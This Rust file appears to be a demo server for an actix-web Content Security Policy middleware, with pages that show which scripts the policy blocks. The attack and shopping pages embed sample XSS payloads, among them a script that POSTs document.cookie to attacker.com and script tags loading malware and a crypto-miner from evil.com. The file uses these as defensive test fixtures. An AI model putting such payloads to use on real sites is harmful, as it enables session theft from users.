use actix_web::{
    middleware::Logger, web, App, HttpMessage, HttpRequest, HttpResponse, HttpServer, Result,
};
use actix_web_csp::{
    csp_with_reporting, CspPolicyBuilder, CspViolationReport, RequestNonce, Source,
};

const SECURE_HTML: &str = r#"<!DOCTYPE html>
<html>
<head>
    <title>Secure Test Page</title>
    <style nonce="{nonce}">
        body { font-family: Arial, sans-serif; margin: 20px; }
        .safe { color: green; }
        .warning { color: orange; }
        .danger { color: red; }
    </style>
</head>
<body>
    <h1>CSP Security Test</h1>
    <div class="safe">This page is protected with secure CSP rules.</div>

    <script nonce="{nonce}">
        console.log('Secure script is running');
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('safe-button').addEventListener('click', function() {
                alert('Secure action completed!');
            });
        });
    </script>

    <button id="safe-button">Secure Button</button>

    <!-- This script will be blocked by CSP -->
    <script>
        console.log('This script will be blocked!');
    </script>
</body>
</html>"#;

const SHOPPING_HTML: &str = r#"<!DOCTYPE html>
<html>
<head>
    <title>Shopping Site Test</title>
    <style nonce="{nonce}">
        .product { border: 1px solid #ccc; padding: 10px; margin: 10px; }
        .price { font-weight: bold; color: #007bff; }
        .cart-button { background: #28a745; color: white; padding: 5px 10px; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Secure Shopping Site</h1>

    <div class="product">
        <h3>Product 1</h3>
        <p class="price">₺99.99</p>
        <button class="cart-button" onclick="addToCart(1)">Add to Cart</button>
    </div>

    <div class="product">
        <h3>Product 2</h3>
        <p class="price">₺149.99</p>
        <button class="cart-button" onclick="addToCart(2)">Add to Cart</button>
    </div>

    <div id="cart-status"></div>

    <script nonce="{nonce}">
        let cart = [];

        function addToCart(productId) {
            cart.push(productId);
            updateCartStatus();
            console.log('Product added to cart:', productId);
        }

        function updateCartStatus() {
            const status = document.getElementById('cart-status');
            status.innerHTML = `You have ${cart.length} products in your cart`;
        }

        function sendSecureRequest() {
            fetch('/api/cart', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({ items: cart })
            })
            .then(response => response.json())
            .then(data => console.log('Secure request completed:', data))
            .catch(error => console.error('Error:', error));
        }
    </script>

    <!-- This inline script will be blocked by CSP -->
    <script>
        document.cookie = "malicious=true";
        window.location = "http://evil-site.com";
    </script>

    <!-- This external script will also be blocked -->
    <script src="http://malicious-site.com/evil.js"></script>
</body>
</html>"#;

const ATTACK_HTML: &str = r#"<!DOCTYPE html>
<html>
<head>
    <title>Attack Test</title>
    <!-- This inline style will be blocked -->
    <style>
        body { background: red !important; }
    </style>
</head>
<body>
    <h1>CSP Attack Test</h1>

    <!-- XSS attack attempts -->
    <div onclick="alert('XSS!')">Click Me</div>

    <img src="x" onerror="alert('Image XSS!')">

    <script>
        alert('Inline script attack!');
        document.cookie = "stolen=data";
        fetch('http://attacker.com/steal', {
            method: 'POST',
            body: document.cookie
        });
    </script>

    <!-- External malicious scripts -->
    <script src="http://evil.com/malware.js"></script>
    <script src="https://cdn.evil.com/crypto-miner.js"></script>
</body>
</html>"#;

fn handle_csp_violation(report: CspViolationReport) {
    println!("🚨 CSP VIOLATION DETECTED:");
    println!("  Document URI: {}", report.document_uri);
    println!("  Violated directive: {}", report.violated_directive);
    println!("  Blocked URI: {}", report.blocked_uri);
    println!("  Source file: {}", report.source_file.unwrap_or_default());
    println!(
        "  Line number: {}",
        report.line_number.unwrap_or_default()
    );
    println!(
        "  Column number: {}",
        report.column_number.unwrap_or_default()
    );
    println!("  Original policy: {}", report.original_policy);
    println!("---");
}

async fn secure_page(req: HttpRequest) -> Result<HttpResponse> {
    let nonce = match req.extensions().get::<RequestNonce>() {
        Some(request_nonce) => request_nonce.to_string(),
        None => uuid::Uuid::new_v4().to_string(),
    };

    let html = SECURE_HTML.replace("{nonce}", &nonce);

    Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html))
}

async fn shopping_page(req: HttpRequest) -> Result<HttpResponse> {
    let nonce = match req.extensions().get::<RequestNonce>() {
        Some(request_nonce) => request_nonce.to_string(),
        None => uuid::Uuid::new_v4().to_string(),
    };

    let html = SHOPPING_HTML.replace("{nonce}", &nonce);

    Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html))
}

async fn attack_page() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(ATTACK_HTML))
}

async fn api_cart(data: web::Json<serde_json::Value>) -> Result<HttpResponse> {
    println!("Cart API called: {:?}", data);
    Ok(HttpResponse::Ok().json(serde_json::json!({
        "status": "success",
        "message": "Cart updated"
    })))
}

async fn index() -> Result<HttpResponse> {
    let html = r#"<!DOCTYPE html>
<html>
<head>
    <title>CSP Test Home Page</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .test-link { display: block; margin: 10px 0; padding: 10px; background: #f0f0f0; text-decoration: none; color: #333; }
        .test-link:hover { background: #e0e0e0; }
    </style>
</head>
<body>
    <h1>CSP Middleware Test Pages</h1>
    <p>Visit the test pages below to test CSP security rules:</p>

    <a href="/secure" class="test-link">
        <strong>Secure Page</strong><br>
        Secure content protected with nonce
    </a>

    <a href="/shopping" class="test-link">
        <strong>Shopping Site</strong><br>
        Security test with e-commerce scenario
    </a>

    <a href="/attack" class="test-link">
        <strong>Attack Test</strong><br>
        Blocking XSS and other attacks
    </a>

    <h2>Test Instructions:</h2>
    <ol>
        <li>Visit each page</li>
        <li>Open the browser console (F12)</li>
        <li>Observe CSP violation messages</li>
        <li>Check violation reports in server logs</li>
    </ol>
</body>
</html>"#;

    Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html))
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    env_logger::init();

    println!("🚀 CSP Test Server starting...");
    println!("📍 Test pages:");
    println!("   http://localhost:8080/ - Home page");
    println!("   http://localhost:8080/secure - Secure page");
    println!("   http://localhost:8080/shopping - Shopping site");
    println!("   http://localhost:8080/attack - Attack test");
    println!("   http://localhost:8080/csp-report - CSP violation reports");

    HttpServer::new(|| {
        let secure_policy = CspPolicyBuilder::new()
            .default_src([Source::Self_])
            .script_src([Source::Self_])
            .style_src([Source::Self_])
            .img_src([
                Source::Self_,
                Source::Scheme("data".into()),
                Source::Scheme("https".into()),
            ])
            .connect_src([Source::Self_, Source::Scheme("https".into())])
            .font_src([Source::Self_, Source::Scheme("data".into())])
            .object_src([Source::None])
            .media_src([Source::Self_])
            .frame_src([Source::None])
            .base_uri([Source::Self_])
            .form_action([Source::Self_])
            .report_uri("/csp-report")
            .build_unchecked();

        let (middleware, configurator) = csp_with_reporting(secure_policy, handle_csp_violation);

        App::new()
            .wrap(Logger::default())
            .wrap(middleware)
            .configure(configurator)
            .route("/", web::get().to(index))
            .route("/secure", web::get().to(secure_page))
            .route("/shopping", web::get().to(shopping_page))
            .route("/attack", web::get().to(attack_page))
            .route("/api/cart", web::post().to(api_cart))
    })
    .bind("127.0.0.1:8080")?
    .run()
    .await
}
